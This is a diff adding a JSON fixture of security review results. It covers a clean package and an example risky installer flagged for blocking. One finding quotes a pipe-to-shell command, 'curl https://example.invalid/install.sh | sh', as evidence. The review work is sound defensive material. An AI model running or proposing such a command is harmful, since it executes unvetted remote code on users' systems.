@@ -1,0 +1,57 @@
+{
+  "version": "phase-8-round1",
+  "review_runs": [
+    {
+      "review_run_id": "sec-run-safe-skill-001",
+      "unit_id": "unit-impeccable-main",
+      "review_method": "static-pattern-review",
+      "review_state": "reviewed-no-findings"
+    },
+    {
+      "review_run_id": "sec-run-risky-installer-001",
+      "unit_id": "unit-example-risky-installer",
+      "review_method": "installer-review",
+      "review_state": "reviewed-findings-present"
+    }
+  ],
+  "findings": [
+    {
+      "finding_id": "finding-risky-001",
+      "unit_id": "unit-example-risky-installer",
+      "category": "external-execution-risk",
+      "severity": "high",
+      "confidence": "high",
+      "evidence_type": "install-command",
+      "evidence_ref": "curl https://example.invalid/install.sh | sh",
+      "summary": "Installer executes remote code without validation."
+    },
+    {
+      "finding_id": "finding-risky-002",
+      "unit_id": "unit-example-risky-installer",
+      "category": "unsafe-automation-risk",
+      "severity": "medium",
+      "confidence": "high",
+      "evidence_type": "file-snippet",
+      "evidence_ref": "SKILL.md destructive command guidance",
+      "summary": "Instructions imply destructive operations without explicit safeguards."
+    }
+  ],
+  "results": [
+    {
+      "security_result_id": "sec-result-safe-001",
+      "unit_id": "unit-impeccable-main",
+      "security_state": "reviewed-no-findings",
+      "highest_severity": "info",
+      "finding_count": 0,
+      "block_recommendation": false
+    },
+    {
+      "security_result_id": "sec-result-risky-001",
+      "unit_id": "unit-example-risky-installer",
+      "security_state": "reviewed-findings-present",
+      "highest_severity": "high",
+      "finding_count": 2,
+      "block_recommendation": true
+    }
+  ]
+}
